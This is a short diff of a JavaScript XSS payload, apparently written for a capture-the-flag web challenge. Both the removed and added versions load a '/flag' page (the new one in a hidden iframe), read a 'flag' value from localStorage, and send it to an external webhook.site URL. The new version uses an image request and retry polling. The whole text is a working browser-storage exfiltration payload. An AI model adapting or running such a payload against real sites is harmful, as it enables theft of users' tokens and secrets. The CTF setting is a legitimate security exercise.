@@ -1,10 +1,25 @@
 <script>
-    // Step 1: go to /flag (re-trigger flag setting)
-    location.href = "http://traefik/flag#exfil";
-    
-    // Step 2: after ~3s delay (for flag to be set), redirect to your webhook with localStorage content
-    setTimeout(() => {
-        const f = localStorage.getItem("flag");
-        location.href = "https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?f=" + encodeURIComponent(f);
-    }, 3000);
+let flag = null;
+
+function tryExfil() {
+    try {
+        flag = localStorage.getItem("flag");
+        if (flag) {
+            new Image().src = "https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf?f=" + encodeURIComponent(flag);
+        } else {
+            setTimeout(tryExfil, 1000); // retry
+        }
+    } catch (e) {
+        setTimeout(tryExfil, 1000); // in case of error
+    }
+}
+
+// Visit /flag in iframe to retrigger flag injection
+let f = document.createElement("iframe");
+f.src = "http://traefik/flag";
+f.style.display = "none";
+document.body.appendChild(f);
+
+// Start polling
+tryExfil();
 </script>
